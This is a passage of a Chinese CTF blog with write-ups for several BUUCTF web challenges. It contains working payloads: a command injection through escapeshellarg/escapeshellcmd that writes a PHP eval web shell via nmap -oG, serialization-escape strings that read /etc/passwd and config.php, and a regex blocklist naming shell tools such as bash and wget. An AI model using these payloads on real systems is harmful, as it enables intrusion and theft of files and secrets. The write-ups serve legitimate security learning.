main()</span><br></pre></td></tr></table></figure><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><p>打开发现有源码,整理下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>) </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>) </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span> </span><br><span class="line">self.action = action </span><br><span class="line">self.param = param </span><br><span class="line">self.sign = sign </span><br><span class="line">self.sandbox = md5(ip) </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): </span><br><span class="line"><span class="comment">#SandBox For Remote_Addr </span></span><br><span class="line">os.mkdir(self.sandbox) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span> </span><br><span class="line">result = &#123;&#125; </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line"><span class="keyword">if</span> (self.checkSign()): </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action: </span><br><span class="line">tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">resp = scan(self.param) </span><br><span class="line"><span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>): </span><br><span class="line">result[<span class="string">&#x27;data&#x27;</span>] = resp </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">print</span> resp tmpfile.write(resp) </span><br><span class="line">tmpfile.close() </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action: </span><br><span class="line">f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line">result[<span class="string">&#x27;data&#x27;</span>] = f.read() </span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>: </span><br><span class="line">result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span> </span><br><span class="line"><span class="keyword">return</span> result </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span> </span><br><span class="line"><span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="comment">#generate Sign For Action Scan. </span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span> </span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">action = <span class="string">&quot;scan&quot;</span> </span><br><span class="line"><span class="keyword">return</span> getSign(action, param) </span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span> </span><br><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>)) </span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>)) </span><br><span class="line">ip = request.remote_addr </span><br><span class="line"><span class="keyword">if</span>(waf(param)): </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span> </span><br><span class="line">task = Task(action, param, sign, ip) </span><br><span class="line"><span class="keyword">return</span> json.dumps(task.Exec()) </span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line"><span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span> </span><br><span class="line">socket.setdefaulttimeout(<span class="number">1</span>) </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"><span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] </span><br><span class="line"><span class="keyword">except</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span> </span><br><span class="line"><span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span> </span><br><span class="line"><span class="keyword">return</span> hashlib.md5(content).hexdigest() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span> </span><br><span class="line">check=param.strip().lower() </span><br><span class="line"><span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>): </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.debug = <span class="literal">False</span> </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>) </span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>访问得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>escapeshellarg函数:</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200503152048.png" style="zoom: 67%;"><p>escapeshellcmd函数：</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200503152213.png" style="zoom:67%;"><p>这两个函数本身是没什么问题的，但是如果放在一起用，就可能造成漏洞</p><p>假设我们传入<code>?host=127.0.0.1&#39;</code>，以linux为例(Windows会不同)，未处理前</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>经过escapeshellarg函数，先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>经过escapeshellcmd函数，<code>\</code>会被转义，最后一个<code>&#39;</code>由于不匹配也被转义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>此时执行的就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>相当于,成对的<code>&#39;</code>可以去掉掉，<code>\\</code>转义成<code>\</code>，<code>\&#39;</code>转义成<code>&#39;</code>，最终：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F 127.0.0.1\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>我们构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure><p>最终执行的就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span> \&lt;\?php @<span class="built_in">eval</span>\(\<span class="variable">$_POST</span>\[1\]\)\;\?\&gt; -oG hack.php <span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200504135842.png" style="zoom:80%;"><p>可以看到，由于空格的存在nmap把后面的都当作是一个个域名了，并成功的写入shell</p><p><strong>我们再看一下其他的情况：</strong></p><p>只用escapeshellarg函数，执行的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt; -oG hack.php <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>只用escapeshellcmd函数，执行的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27; \&lt;\?php @eval\(\$_POST\[1\]\)\;\?\&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure><p>先用escapeshellcmd函数后用escapeshellarg函数，执行的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F <span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> \&lt;\?php @<span class="built_in">eval</span>\(\<span class="variable">$_POST</span>\[1\]\)\;\?\&gt; -oG hack.php <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这三种好像都无法注入命令</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>扫目录发现<code>www.zip</code>，在<code>class.php</code>看到过滤函数，输入已经不可能了</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200515170617.png" style="zoom: 80%;"><p>找了找发现<code>profile.php</code>中有个敏感函数</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200515170424.png" style="zoom:80%;"><p>分析一下代码流程，用户登陆首先进入user类里的login()方法，在里面经过父类(mysql)filter方法的过滤，调用父类的select()方法,接着判断md5值是否相等，相等返回true，并把username存到session里</p><p>再看看<code>update.php</code>，虽然有上传但是没法解析成php，把填的信息序列化存到数据库里</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM截图20200515182949.png" style="zoom:67%;"><p>接着再看<code>profile.php</code>这里调用了user类的show_profile()方法，同样经过过滤调用父类的select方法，把查询结果反序列化</p><p>由于filter进行了替换，很容易就想到了反序列化字符逃逸，看下怎末替换的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 把&#x27; \\ 替换成 _ 长度减一</span></span><br><span class="line"><span class="comment"># 把select insert update delete where 替换成hackerwhere时长度加一</span></span><br></pre></td></tr></table></figure><p>正常序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;1111111111@qq.com&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($profile);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;11111111111&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1111111111@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/341be97d9aff90c9978347f66f945b77&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们发现最后一个不可控photo，而email和nickname可控，但有长度限制，很明显直接这样是逃逸不出去的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>仔细看下，最后一个匹配和前面俩不一样，表示只要是非字母数字下划线都行，我们可以数组绕过这两个函数，两个函数都会返回false</p><p>这样序列化过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;1111111111@qq.com&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] []= <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($profile);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;11111111111&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1111111111@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/341be97d9aff90c9978347f66f945b77&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>接着我们就可以无限制的填充nickname了,让它溢出逃逸出去</p><p>我们需要添加的内容,长度m=35</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p>列方程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5n+y+m&#x3D;6n+y</span><br></pre></td></tr></table></figure><p>得n=35,即我们需要35个where，构造</p><p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200515220248.png"></p><p>注意数组的构造，然后就能得到读取文件base64的值</p><p>试着去读<code>config.php</code>,需要添加的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>长度为34，故构造34个where，重新注册个账号就可以了</p><p>长度减小(<code>\\</code>替换成<code>_</code>)的方法没法用，因为我们后面没可控的字符</p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><p>打开发现有img参数，第一时间想到文件包含，两次base64解密后16进制转ascii得到<code>555.png</code></p><p>尝试<code>/etc/passwd</code>发现不行，看了下源码发现把除字母数字点号字符都替换为空了，思路要多点，不能局限一种</p><p>直接读index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid 